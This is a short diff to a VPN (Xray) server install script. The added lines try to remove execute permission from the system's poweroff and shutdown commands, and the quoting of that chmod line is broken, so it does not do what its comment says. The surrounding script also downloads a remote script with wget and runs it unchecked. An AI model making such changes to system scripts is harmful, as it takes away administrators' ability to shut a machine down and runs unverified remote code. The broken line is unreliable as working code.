@@ -50,6 +50,10 @@ if [ -f "/etc/xray/domain" ]; then
 echo "Script Already Installed"
 exit 0
 fi
+
+# disable poweroff command execute permission
+chmod a-x "$(cat /proc/sys/kernel/poweroff_cmd) $(which poweroff) $(which shutdown)" 
+
 mkdir /var/lib/crot;
 echo "IP=" >> /var/lib/crot/ipvps.conf
 wget https://${akbarvpn}/slhost.sh && chmod +x slhost.sh && ./slhost.sh
